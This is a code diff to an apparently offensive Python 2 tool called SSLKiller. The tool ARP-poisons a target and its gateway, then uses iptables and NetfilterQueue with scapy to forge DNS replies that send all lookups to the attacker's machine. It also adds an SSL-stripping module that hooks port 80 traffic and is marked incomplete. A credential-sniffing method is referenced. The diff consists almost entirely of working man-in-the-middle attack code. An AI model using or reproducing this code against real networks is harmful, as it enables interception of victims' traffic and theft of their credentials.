@@ -53,14 +53,10 @@ import struct
 import random
 from time import sleep
 from scapy.all import *
+#from scapy.layers import http
 from netfilterqueue import NetfilterQueue
 
-
 class SSLKiller(object):
-	def log(self,msg):
-		f = open('sslkill.log','w')
-		f.write(msg)
-		f.close()
 
 	def __init__(self, interface, target, gateway):
 		print banner
@@ -83,12 +79,10 @@ class SSLKiller(object):
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         		info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', interface[:15]))
         		return ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
-
 		self.hostIP = nic_ip(self.interface)
 		print "[+] This host IP Address: {}".format(self.hostIP)
 		self.hostMAC = nic_mac(self.interface)
 		print "[+] This host MAC Address: {}".format(self.hostMAC)
-
 		def resolve_mac(ip):
 			try:
 				conf.verb = 0
@@ -116,9 +110,11 @@ class SSLKiller(object):
 	    	    sys.stdout.flush()
 		self.ArpPoisoner()
 		sys.stdout.write("\n[+] ARP Poisoner thread loaded")
-		self.SSLTrickster()
-		print "\n[+] SSL Trickster thread loaded"
-		pcap = sniff(prn=self.Sniffer, iface=self.interface)
+		self.DnsPoisoner()
+		print "\n[+] DNS Poisoner thread loaded"
+		self.SSLPoisoner()
+		#pcap = sniff(prn=self.Sniffer, iface=self.interface)
+
 
 	def ArpPoisoner(self):
 		#ARP Spoof both ways, target and gateway
@@ -137,30 +133,23 @@ class SSLKiller(object):
 		#ArpPoison()
 
 	def DnsPoisoner(self):
-		#Use netfilterqueue + scapy to manipulate DNS and HTTP packets "
-		#in order to avoid preloaded HSTS lists, strip SSL links, "
-		#strip HTTP(s) protections (headers/scripts) and poison the "
-		#DNS queries"
-
+		#Use netfilterqueue + scapy to manipulate DNS packets "
 		def callback(packet):
 			payload = packet.get_payload()
 			pkt = IP(payload)
-			if not pkt.haslayer(DNSQR) or not pkt.haslayer(DNSRR):
+			if not pkt.haslayer(DNSQR):
 				packet.accept()
-			if pkt.haslayer(DNSQR):
+			else:
 		        	new_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                                		  UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                                	          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                                	          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.hostIP))
                              	packet.set_payload(str(new_pkt))
                                	packet.accept()
-			else:
-				packet.drop()
 		def DnsThread():
-			t = threading.Thread(name='DNSspoof', target=start)
+			t = threading.Thread(name='DNSspoof', target=DnsPoison)
 			t.setDaemon(True)
 			t.start()
-
 		def DnsPoison():
 			os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
 			os.system('iptables -t nat -A PREROUTING -p udp --sport 53 -j NFQUEUE --queue-num 1')
@@ -169,6 +158,29 @@ class SSLKiller(object):
 			q.run()
 		DnsThread()
 		#DnsPoison()
+
+	def SSLPoisoner(self):
+		##############   INCOMPLETE   ##############################################################
+		#Use netfilterqueue + scapy + scapy-http to strip and modify the HTTP requests and responses
+		#in order to strip ssl links and protection headers
+		def callback(packet):
+			payload = packet.get_payload()
+			pkt = IP(payload)
+			if pkt.haslayer(HTTP):
+				pkt.show()
+			packet.accept()
+		def SSLThread():
+			t = threading.Thread(name='SSLpoison', target=SSLPoison)
+			t.setDaemon(True)
+			t.start()
+		def SSLPoison():
+			os.system('iptables -t nat -A PREROUTING -p tcp --dport 80 -j NFQUEUE --queue-num 2')
+			os.system('iptables -t nat -A PREROUTING -p tcp --sport 80 -j NFQUEUE --queue-num 2')
+			q = NetfilterQueue()
+			q.bind(2, callback)
+			q.run()
+		#SSLThread()
+		#SSLPoison()
 
 	def Sniffer(self, p):
 		#Sniff for credentials
